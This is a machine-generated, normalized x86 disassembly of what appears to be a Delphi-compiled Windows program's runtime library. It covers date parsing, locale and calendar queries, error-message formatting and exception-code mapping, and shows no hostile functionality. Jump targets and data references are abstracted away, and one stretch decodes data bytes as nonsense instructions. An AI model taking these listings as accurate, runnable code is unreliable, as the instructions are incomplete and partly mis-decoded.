mov eax [ ebp - 0x20 ]
lea edx [ ebp - 0x1c ]
call sub_407c2c
mov eax [ ebp - 0x1c ]
call sub_40a540
mov [ ebp - 0x4 ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40a912
lea eax [ ebp - 0x28 ]
mov edx 0x4
call sub_403f80
retn
mov edx ebx
mov cl [ rw-data ]
mov eax esi
call sub_40a474
test al al
je r-xdata
lea eax [ ebp - 0x16 ]
push eax
lea ecx [ ebp - 0xe ]
mov edx ebx
mov eax esi
call sub_40a354
test al al
je r-xdata
mov edx ebx
mov cl [ rw-data ]
mov eax esi
call sub_40a474
test al al
je r-xdata
call sub_409734
mov edi eax
cmp [ ebp - 0xa ] 0x1
jne r-xdata
lea eax [ ebp - 0x17 ]
push eax
lea ecx [ ebp - 0x10 ]
mov edx ebx
mov eax esi
call sub_40a354
test al al
je r-xdata
mov ax [ ebp - 0xc ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0xe ]
mov [ ebp - 0x14 ] ax
mov ax [ ebp - 0xc ]
mov [ ebp - 0x14 ] ax
mov ax [ ebp - 0xe ]
mov [ ebp - 0x12 ] ax
jmp r-xdata
mov al [ ebp - 0xa ]
sub al 0x1
jb r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov cx [ ebp - 0x14 ]
mov dx [ ebp - 0x12 ]
mov eax edi
call sub_4094d8
mov [ ebp - 0x9 ] al
mov edx [ rw-data ]
mov eax r-xdata
call sub_404560
test eax eax
je r-xdata
mov edx ebx
mov cl [ rw-data ]
mov eax esi
call sub_40a474
mov edx ebx
mov eax esi
call sub_40a330
cmp [ rw-data ] 0x0
je r-xdata
mov di [ ebp - 0x10 ]
mov al [ ebp - 0x17 ]
mov [ ebp - 0x18 ] al
mov ax [ ebp - 0xc ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0xe ]
mov [ ebp - 0x14 ] ax
jmp r-xdata
je r-xdata
mov eax [ rw-data ]
mov al [ eax ]
add al 0xd0
sub al 0xa
jae r-xdata
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
mov di [ ebp - 0x10 ]
mov al [ ebp - 0x17 ]
mov [ ebp - 0x18 ] al
mov ax [ ebp - 0xe ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0xc ]
mov [ ebp - 0x14 ] ax
jmp r-xdata
dec al
je r-xdata
mov eax esi
call sub_40421c
cmp eax [ ebx ]
jl r-xdata
mov edx ebx
mov eax esi
call sub_40a4f8
jmp r-xdata
cmp [ ebp - 0x18 ] 0x2
ja r-xdata
push ebp
movzx eax di
call sub_40a594
pop ecx
mov edi eax
jmp r-xdata
mov di [ ebp - 0xc ]
mov al [ ebp - 0x15 ]
mov [ ebp - 0x18 ] al
mov ax [ ebp - 0xe ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] ax
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40a330
mov eax esi
call sub_40421c
cmp eax [ ebx ]
jl r-xdata
mov eax [ ebx ]
cmp [ esi + eax - 0x1 ] 0x20
jne r-xdata
call sub_409734
movzx ecx ax
movzx eax [ rw-data ]
sub ecx eax
mov eax ecx
push ecx
mov ecx 0x64
cdq
idiv ecx
pop ecx
imul ax ax 0x64
add di ax
cmp [ rw-data ] 0x0
jbe r-xdata
lea eax [ ebp - 0x24 ]
push eax
mov eax [ rw-data ]
call sub_40421c
mov ecx eax
mov edx [ ebx ]
mov eax esi
call sub_40447c
mov edx [ ebp - 0x24 ]
mov eax [ rw-data ]
call sub_407bbc
test eax eax
je r-xdata
inc [ ebx ]
movzx eax di
cmp ecx eax
jle r-xdata
lea eax [ ebp - 0x28 ]
push eax
mov eax [ rw-data ]
call sub_40421c
mov ecx eax
mov edx [ ebx ]
mov eax esi
call sub_40447c
mov edx [ ebp - 0x28 ]
mov eax [ rw-data ]
call sub_407bbc
test eax eax
jne r-xdata
add di 0x64
jmp r-xdata
sub_40a934
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp ] ecx
mov esi edx
mov ebp eax
xor ebx ebx
or edi 0xffffffff
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40a3e8
test al al
jne r-xdata
xor edi edi
jmp r-xdata
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40a3e8
test al al
je r-xdata
test edi edi
jl r-xdata
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40a3e8
test al al
jne r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0x8 ]
mov edx esi
mov eax ebp
call sub_40a354
test al al
je r-xdata
mov edx esi
mov eax ebp
call sub_40a330
mov edi 0xc
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40a3e8
test al al
je r-xdata
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x6 ] 0x0
mov [ esp + 0x8 ] 0x0
mov [ esp + 0xa ] 0x0
mov edx esi
mov cl [ rw-data ]
mov eax ebp
call sub_40a474
test al al
je r-xdata
test edi edi
jge r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0xa ]
mov edx esi
mov eax ebp
call sub_40a354
test al al
je r-xdata
test edi edi
jl r-xdata
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40a3e8
test al al
jne r-xdata
mov edx esi
mov cl [ rw-data ]
mov eax ebp
call sub_40a474
test al al
je r-xdata
mov edx esi
mov eax ebp
call sub_40a330
mov ax [ esp + 0xa ]
push eax
mov eax [ esp + 0x4 ]
push eax
mov cx [ esp + 0x10 ]
mov dx [ esp + 0xe ]
mov ax [ esp + 0xc ]
call sub_4093d0
mov ebx eax
cmp [ esp + 0x4 ] 0x0
je r-xdata
xor edi edi
jmp r-xdata
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40a3e8
test al al
je r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0xc ]
mov edx esi
mov eax ebp
call sub_40a354
test al al
je r-xdata
cmp [ esp + 0x4 ] 0xc
ja r-xdata
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40a3e8
test al al
jne r-xdata
mov edx esi
mov cl [ rw-data ]
mov eax ebp
call sub_40a474
test al al
je r-xdata
cmp [ esp + 0x4 ] 0xc
jne r-xdata
mov edi 0xc
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40a3e8
test al al
je r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0xe ]
mov edx esi
mov eax ebp
call sub_40a354
test al al
je r-xdata
add [ esp + 0x4 ] di
mov [ esp + 0x4 ] 0x0
sub_40ab28
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov [ esp ] 0x1
mov ecx esi
mov edx esp
mov eax ebx
call sub_40a934
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_40421c
cmp eax [ esp ]
jl r-xdata
pop edx
pop esi
pop ebx
retn
mov al 0x1
sub_40ab5c
push ebx
push esi
push edi
add esp 0xffffffe8
mov edi edx
mov esi eax
mov bl 0x1
mov [ esp ] 0x1
xor eax eax
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] eax
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax esi
call sub_40a5f0
test al al
je r-xdata
mov edx edi
mov eax esi
call sub_40ab28
mov ebx eax
jmp r-xdata
mov eax esi
call sub_40421c
cmp eax [ esp ]
jl r-xdata
mov eax ebx
add esp 0x18
pop edi
pop esi
pop ebx
retn
fld [ esp + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jb r-xdata
lea ecx [ esp + 0x10 ]
mov edx esp
mov eax esi
call sub_40a934
test al al
jne r-xdata
fld [ esp + 0x8 ]
fsub [ esp + 0x10 ]
fstp [ edi ]
fwait
fld [ esp + 0x8 ]
fadd [ esp + 0x10 ]
fstp [ edi ]
fwait
jmp r-xdata
sub_40abe8
push ebx
add esp 0xffffff00
mov ebx edx
push 0x0
push 0x100
lea edx [ esp + 0x8 ]
push edx
push 0x0
push eax
push 0x0
push 0x3200
call FormatMessageA
jmp r-xdata
test eax eax
jle r-xdata
mov edx esp
mov ecx ebx
xchg ecx eax
call sub_40404c
add esp 0x100
pop ebx
retn
mov dl [ esp + eax - 0x1 ]
sub dl 0x21
jb r-xdata
dec eax
sub dl 0xd
je r-xdata
sub_40ac34
push ebp
mov ebp esp
add esp 0xffffff00
push ebx
push esi
mov esi ecx
mov ebx [ ebp + 0x8 ]
push 0x100
lea ecx [ ebp - 0x100 ]
push ecx
push edx
push eax
call GetLocaleInfoA
test eax eax
jle r-xdata
mov eax ebx
mov edx esi
call sub_403fb0
mov ecx eax
dec ecx
lea edx [ ebp - 0x100 ]
mov eax ebx
call sub_40404c
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_40ac80
push ebx
push esi
push edi
push ecx
mov ebx ecx
mov esi edx
mov edi eax
push 0x2
lea eax [ esp + 0x4 ]
push eax
push esi
push edi
call GetLocaleInfoA
test eax eax
jle r-xdata
mov eax ebx
mov al [ esp ]
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
sub_40aca8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ebx [ ebp + 0x8 ]
push ebx
mov eax [ ebp + 0x10 ]
mov eax [ eax - 0x4 ]
xor ecx ecx
mov edx esi
call sub_40ac34
cmp [ ebx ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax [ ebp - 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx ebx
call sub_405a5c
sub_40ace4
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_40adf7
push [ fs : eax ]
mov [ fs : eax ] esp
call GetThreadLocale
mov [ ebp - 0x4 ] eax
mov ebx 0x1
mov esi rw-data
mov edi rw-data
push ebp
push 0xb
lea eax [ ebp - 0xc ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
lea eax [ ebx + 0x44 ]
dec eax
call sub_40aca8
pop ecx
mov edx [ ebp - 0xc ]
mov eax esi
call sub_403fb0
push ebp
push 0xb
lea eax [ ebp - 0x10 ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
lea eax [ ebx + 0x38 ]
dec eax
call sub_40aca8
pop ecx
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_403fb0
inc ebx
add edi 0x4
add esi 0x4
cmp ebx 0xd
jne r-xdata
mov ebx 0x1
mov esi rw-data
mov edi rw-data
lea eax [ ebx + 0x5 ]
mov ecx 0x7
cdq
idiv ecx
mov [ ebp - 0x8 ] edx
push ebp
push 0x6
lea eax [ ebp - 0x14 ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
mov eax [ ebp - 0x8 ]
add eax 0x31
call sub_40aca8
pop ecx
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_403fb0
push ebp
push 0x6
lea eax [ ebp - 0x18 ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
mov eax [ ebp - 0x8 ]
add eax 0x2a
call sub_40aca8
pop ecx
mov edx [ ebp - 0x18 ]
mov eax edi
call sub_403fb0
inc ebx
add edi 0x4
add esi 0x4
cmp ebx 0x8
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40adfe
lea eax [ ebp - 0x18 ]
mov edx 0x4
call sub_403f80
retn
sub_40ae08
push ebp
mov ebp esp
push ebx
push esi
xor esi esi
mov ebx 0x1
jmp r-xdata
cmp [ ebx * 4 + rw-data ] 0x0
jne r-xdata
cmp ebx 0x7
je r-xdata
lea eax [ ebx * 4 + rw-data ]
mov edx [ ebp + 0x8 ]
call sub_404154
mov esi 0x1
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
inc ebx
sub_40ae44
push ebp
mov ebp esp
push 0x0
push ebx
push esi
xor eax eax
push ebp
push sub_40aea9
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
mov ebx 0x1
jmp r-xdata
cmp [ ebx * 4 + rw-data ] 0xffffffff
jne r-xdata
cmp ebx 0x7
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_404154
mov eax [ ebp - 0x4 ]
xor edx edx
call sub_40800c
mov [ ebx * 4 + rw-data ] eax
mov esi 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40aeb0
lea eax [ ebp - 0x4 ]
call sub_403f5c
retn
inc ebx
sub_40aebc
push ebp
mov ebp esp
push 0x0
push esi
xor eax eax
push ebp
push sub_40af53
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
call GetThreadLocale
mov ecx r-xdata
mov edx 0x100b
call sub_40ac34
mov eax [ ebp - 0x4 ]
mov edx 0x1
call sub_40800c
mov esi eax
mov eax esi
add eax 0xfffffffd
sub eax 0x3
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40af5a
lea eax [ ebp - 0x4 ]
call sub_403f5c
retn
push 0x4
push esi
call GetThreadLocale
push eax
push sub_40ae08
call EnumCalendarInfoA
mov edx 0x7
mov eax rw-data
mov [ eax ] 0xffffffff
add eax 0x4
dec edx
jne r-xdata
push 0x3
push esi
call GetThreadLocale
push eax
push sub_40ae44
call EnumCalendarInfoA
sub_40af6c
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_40b136
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx 0x1
mov eax edi
call sub_403f5c
lea eax [ ebp - 0x8 ]
push eax
call GetThreadLocale
mov ecx r-xdata
mov edx 0x1009
call sub_40ac34
mov eax [ ebp - 0x8 ]
mov edx 0x1
call sub_40800c
add eax 0xfffffffd
sub eax 0x3
jb r-xdata
mov eax esi
call sub_40421c
cmp ebx eax
jle r-xdata
mov eax [ rw-data ]
sub eax 0x4
je r-xdata
mov al [ esi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b13d
lea eax [ ebp - 0x14 ]
mov edx 0x4
call sub_403f80
retn
mov al 0x1
add eax 0xfffffff3
sub eax 0x2
jb r-xdata
mov edx r-xdata
lea eax [ esi + ebx - 0x1 ]
mov ecx 0x2
call sub_4085e8
test eax eax
jne r-xdata
mov edx ebx
mov eax esi
call sub_40bfdc
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax esi
call sub_40447c
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_404224
add ebx [ ebp - 0x4 ]
jmp r-xdata
mov eax edi
mov edx esi
call sub_403fb0
jmp r-xdata
jmp r-xdata
xor eax eax
jmp r-xdata
mov edx r-xdata
lea eax [ esi + ebx - 0x1 ]
mov ecx 0x4
call sub_4085e8
test eax eax
jne r-xdata
mov eax edi
mov edx r-xdata
call sub_404224
inc ebx
jmp r-xdata
mov eax esi
call sub_40421c
cmp ebx eax
jle r-xdata
test al al
je r-xdata
mov edx r-xdata
lea eax [ esi + ebx - 0x1 ]
mov ecx 0x2
call sub_4085e8
test eax eax
jne r-xdata
mov eax edi
mov edx r-xdata
call sub_404224
add ebx 0x3
jmp r-xdata
inc ebx
mov al [ esi + ebx - 0x1 ]
sub al 0x47
je r-xdata
jmp r-xdata
mov al [ esi + ebx - 0x1 ]
sub al 0x59
je r-xdata
mov eax edi
mov edx r-xdata
call sub_404224
inc ebx
jmp r-xdata
inc ebx
sub al 0x20
je r-xdata
mov eax edi
mov edx r-xdata
call sub_404224
jmp r-xdata
sub al 0x20
jne r-xdata
lea eax [ ebp - 0xc ]
mov dl [ esi + ebx - 0x1 ]
call sub_404144
mov edx [ ebp - 0xc ]
mov eax edi
call sub_404224
lea eax [ ebp - 0x14 ]
mov dl [ esi + ebx - 0x1 ]
call sub_404144
mov edx [ ebp - 0x14 ]
mov eax edi
call sub_404224
sub_40b1a0
push ebp
mov ebp esp
add esp 0xfffffba8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
push 0x1c
lea eax [ ebp - 0x330 ]
push eax
push ebx
call VirtualQuery
cmp [ ebp - 0x320 ] 0x1000
jne r-xdata
push 0x105
lea eax [ ebp - 0x212 ]
push eax
mov eax [ rw-data ]
push eax
call GetModuleFileNameA
mov eax ebx
call sub_40b194
mov [ ebp - 0x8 ] eax
jmp r-xdata
push 0x105
lea eax [ ebp - 0x212 ]
push eax
mov eax [ ebp - 0x32c ]
push eax
call GetModuleFileNameA
test eax eax
jne r-xdata
lea eax [ ebp - 0x212 ]
mov dl 0x5c
call sub_40c12c
mov edx eax
inc edx
lea eax [ ebp - 0x10d ]
mov ecx 0x104
call sub_40850c
mov ebx r-xdata
mov edi r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4033b0
test al al
je r-xdata
sub ebx [ ebp - 0x32c ]
mov [ ebp - 0x8 ] ebx
push 0x100
lea eax [ ebp - 0x312 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
call sub_404fc8
push eax
call LoadStringA
lea edx [ ebp - 0x458 ]
mov eax [ esi ]
call sub_403174
lea eax [ ebp - 0x458 ]
mov [ ebp - 0x358 ] eax
mov [ ebp - 0x354 ] 0x4
lea eax [ ebp - 0x10d ]
mov [ ebp - 0x350 ] eax
mov [ ebp - 0x34c ] 0x6
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x348 ] eax
mov [ ebp - 0x344 ] 0x5
mov [ ebp - 0x340 ] ebx
mov [ ebp - 0x33c ] 0x6
mov [ ebp - 0x338 ] edi
mov [ ebp - 0x334 ] 0x6
lea eax [ ebp - 0x358 ]
push eax
push 0x4
lea ecx [ ebp - 0x312 ]
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_408b30
mov eax [ ebp - 0x4 ]
call sub_40847c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ esi + 0x4 ]
call sub_40441c
mov ebx eax
mov eax ebx
call sub_40847c
test eax eax
je r-xdata
cmp [ ebx + eax - 0x1 ] 0x2e
je r-xdata
mov edi r-xdata
sub_40b328
add esp 0xfffffbbc
push 0x400
lea ecx [ esp + 0x48 ]
call sub_40b1a0
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
push 0x40
lea eax [ esp + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
call sub_404fc8
push eax
call LoadStringA
push 0x2010
lea eax [ esp + 0x8 ]
push eax
lea eax [ esp + 0x4c ]
push eax
push 0x0
call MessageBoxA
mov eax [ rw-data ]
call sub_402acc
call sub_402824
lea eax [ esp + 0x44 ]
push eax
lea eax [ esp + 0x48 ]
push eax
call CharToOemA
push 0x0
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4c ]
call sub_40847c
push eax
lea eax [ esp + 0x50 ]
push eax
push 0xfffffff4
call GetStdHandle
push eax
call WriteFile
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x2
push r-xdata
push 0xfffffff4
call GetStdHandle
push eax
call WriteFile
jmp r-xdata
add esp 0x444
retn
sub_40b3f0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea eax [ edi + 0x4 ]
mov edx esi
call sub_403fb0
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403530
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403588
pop [ fs : 0x0 ]
add esp 0xc
sub_40b42c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_40b486
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov eax esi
call sub_408b70
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x4 ]
call sub_403fb0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b48d
lea eax [ ebp - 0x4 ]
call sub_403f5c
retn
add esp 0xfffffff0
call sub_403530
sub_40b48d
mov eax edi
test bl bl
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
call sub_403588
pop [ fs : 0x0 ]
add esp 0xc
sub_40b4ac
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea edx [ edi + 0x4 ]
mov eax esi
call sub_405a5c
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403530
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403588
pop [ fs : 0x0 ]
add esp 0xc
sub_40b4e8
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_40b554
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_405a5c
mov eax [ ebp - 0x8 ]
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
call sub_408b70
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x4 ]
call sub_403fb0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b55b
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f80
retn
add esp 0xfffffff0
call sub_403530
sub_40b55b
mov eax edi
test bl bl
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
call sub_403588
pop [ fs : 0x0 ]
add esp 0xc
sub_40b5a8
push ebx
push esi
add esp 0xfffffff8
xor ebx ebx
call sub_402898
mov esi eax
jmp r-xdata
cmp ebx 0x6
jg r-xdata
cmp ebx 0x6
jg r-xdata
cmp esi [ ebx * 8 + rw-data ]
jne r-xdata
mov [ esp ] esi
mov [ esp + 0x4 ] 0x0
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4e8
mov ecx [ ebx * 8 + rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b3f0
jmp r-xdata
inc ebx
mov [ eax + 0xc ] esi
pop ecx
pop edx
pop esi
pop ebx
retn
sub_40b608
or al 0xb6
inc eax
add [ esi ] cl
or dl [ ebp + eax * 2 + 0x78 ]
arpl [ ebp + 0x70 ] sp
je r-xdata
pop es
arpl [ gs : eax ] cx
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x40040 ] dl
add [ eax ] al
push ebx
mov ebx edx
mov edx eax
dec dl
je r-xdata
mov edx [ rw-data ]
jmp r-xdata
dec dl
je r-xdata
push ebx
mov eax edx
jmp sub_403998
mov edx [ rw-data ]
jmp r-xdata
dec edx
sub dl 0x16
jb r-xdata
and eax 0xff
lea eax [ eax * 8 + rw-data ]
mov ecx [ eax + 0x4 ]
mov eax [ eax ]
mov dl 0x1
call sub_40b3f0
mov edx eax
jmp r-xdata
jmp r-xdata
call sub_40b5a8
mov edx eax
sub_40b67c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x4 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40b718
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405a5c
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_403ff4
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] 0xb
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0xb
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0x1c ]
push eax
push 0x2
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b42c
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b71f
lea eax [ ebp - 0x20 ]
call sub_403f5c
lea eax [ ebp - 0x4 ]
call sub_403f5c
retn
sub_40b76c
mov eax [ eax ]
cmp eax 0xc0000092
jg r-xdata
cmp eax 0xc0000096
jg r-xdata
je r-xdata
sub eax 0xc00000fd
je r-xdata
je r-xdata
mov al 0x6
retn
cmp eax 0xc000008e
jg r-xdata
mov al 0xe
retn
sub eax 0x3d
je r-xdata
mov al 0xc
retn
sub eax 0xc0000093
je r-xdata
add eax 0x3fffff71
sub eax 0x2
jb r-xdata
je r-xdata
mov al 0xd
retn
jmp r-xdata
mov al 0x9
retn
dec eax
je r-xdata
je r-xdata
mov al 0x7
retn
sub eax 0xc0000005
je r-xdata
mov al 0x16
retn
mov al 0x3
retn
dec eax
je r-xdata
mov al 0x8
retn
jmp r-xdata
mov al 0xb
retn
sub eax 0x87
je r-xdata
mov al 0x5
retn
jmp r-xdata
mov al 0x4
retn
dec eax
je r-xdata
jmp r-xdata
sub_40b804
push ebp
mov ebp esp
add esp 0xfffffe90
push ebx
push esi
xor eax eax
mov [ ebp - 0x170 ] eax
mov [ ebp - 0x14c ] eax
mov [ ebp - 0x154 ] eax
mov [ ebp - 0x150 ] eax
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40b9bf
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov ebx [ eax - 0x4 ]
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405a5c
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405a5c
jmp r-xdata
mov eax [ ebx + 0xc ]
mov [ ebp - 0x16c ] eax
mov [ ebp - 0x168 ] 0x5
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x164 ] eax
mov [ ebp - 0x160 ] 0xb
mov [ ebp - 0x15c ] esi
mov [ ebp - 0x158 ] 0x5
lea eax [ ebp - 0x16c ]
push eax
push 0x2
lea edx [ ebp - 0x170 ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x170 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b42c
mov ebx eax
push 0x105
lea eax [ ebp - 0x125 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call GetModuleFileNameA
test eax eax
je r-xdata
mov esi [ ebx + 0x18 ]
push 0x1c
lea eax [ ebp - 0x20 ]
push eax
mov eax [ ebx + 0xc ]
push eax
call VirtualQuery
cmp [ ebp - 0x10 ] 0x1000
jne r-xdata
mov eax [ ebx + 0xc ]
mov [ ebp - 0x148 ] eax
mov [ ebp - 0x144 ] 0x5
lea eax [ ebp - 0x150 ]
lea edx [ ebp - 0x125 ]
mov ecx 0x105
call sub_4041cc
mov eax [ ebp - 0x150 ]
lea edx [ ebp - 0x14c ]
call sub_408394
mov eax [ ebp - 0x14c ]
mov [ ebp - 0x140 ] eax
mov [ ebp - 0x13c ] 0xb
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x138 ] eax
mov [ ebp - 0x134 ] 0xb
mov [ ebp - 0x130 ] esi
mov [ ebp - 0x12c ] 0x5
lea eax [ ebp - 0x148 ]
push eax
push 0x3
lea edx [ ebp - 0x154 ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x154 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b42c
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b9c6
lea eax [ ebp - 0x170 ]
call sub_403f5c
lea eax [ ebp - 0x154 ]
mov edx 0x3
call sub_403f80
lea eax [ ebp - 0x4 ]
call sub_403f5c
retn
sub_40b9d0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40ba8b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40b76c
and eax 0xff
mov edx eax
add edx 0xfffffffd
sub edx 0x8
jb r-xdata
lea eax [ eax * 8 + rw-data ]
mov ecx [ eax + 0x4 ]
mov eax [ eax ]
mov dl 0x1
call sub_40b3f0
mov ebx eax
jmp r-xdata
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033b0
test al al
je r-xdata
push ebp
call sub_40b804
pop ecx
mov ebx eax
jmp r-xdata
dec edx
sub edx 0xa
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ba92
lea eax [ ebp - 0x10 ]
call sub_403f5c
retn
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0xc ]
push eax
